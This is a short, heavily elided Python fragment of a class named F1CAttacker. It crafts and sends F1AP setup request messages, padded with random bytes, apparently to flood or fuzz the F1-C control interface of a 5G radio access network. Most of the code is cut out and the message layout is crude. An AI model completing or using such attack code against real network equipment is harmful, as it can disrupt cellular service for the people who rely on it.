...
class F1CAttacker:
    ...
    def _send_f1_setup_request(self, ue_id):
        try:
            ...
            logger.debug(f"Error sending F1 setup request: {e}")
    ...
    def _craft_f1ap_setup_request(self, ue_id):
        import struct
        msg = bytearray()
        msg.extend(struct.pack('>I', 0x00000040))
        msg.extend(struct.pack('>I', 0x00000100))
        msg.extend(struct.pack('>I', ue_id))
        msg.extend(struct.pack('>H', 0x0001))
        msg.extend(os.urandom(100))
        return bytes(msg)
